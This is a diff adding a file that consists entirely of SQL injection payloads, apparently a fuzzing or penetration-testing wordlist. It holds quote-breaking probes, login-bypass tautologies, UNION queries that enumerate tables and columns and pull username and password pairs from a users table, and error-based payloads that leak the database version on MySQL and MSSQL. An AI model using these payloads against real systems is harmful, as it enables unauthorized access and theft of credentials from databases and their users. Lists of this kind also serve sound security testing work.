@@ -1,0 +1,38 @@
+'
+"
+`
+)
+' OR '1'='1
+' OR 1=1--
+' OR '1'='1'#
+' OR '1'='1'/*
+' OR '1'='1'-- -
+admin'--
+admin' OR '1'='1'--
+admin' OR 1=1#
+' OR 1=1) --
+' OR 1=1); --
+' OR '1'='1') --
+' OR '1'='1'); --
+' or 1=1 union select 1,2,3--
+' union select 1,2,3--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+-1' UNION SELECT 1,2,3--
+-1' UNION SELECT 1,2,@@version--
+' and 1=0 union all select null, table_name from information_schema.tables where table_schema = database()--
+' and 1=0 union all select null, column_name from information_schema.columns where table_name = 'users'--
+' and 1=0 union all select null, concat(username,':',password) from users--
+' AND GTID_SUBSET(CONCAT('~',(SELECT version()),'~'),1337) -- -
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('~',(SELECT version()),'~')) USING utf8))) -- -
+' AND EXTRACTVALUE(1337,CONCAT('.','~',(SELECT version()),'~')) -- -
+' AND UPDATEXML(1337,CONCAT('.','~',(SELECT version()),'~'),31337) -- -
+' AND EXP(~(SELECT * FROM (SELECT CONCAT('~',(SELECT version()),'~','x'))x)) -- -
+' OR 1 GROUP BY CONCAT('~',(SELECT version()),'~',FLOOR(RAND(0)*2)) HAVING MIN(0) -- -
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
+' AND UUID_TO_BIN(version())='1
+' AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
+' AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -
+' AND 1337=CONCAT('~',(SELECT @@version),'~') -- -
+CAST((SELECT @@version) AS INT)
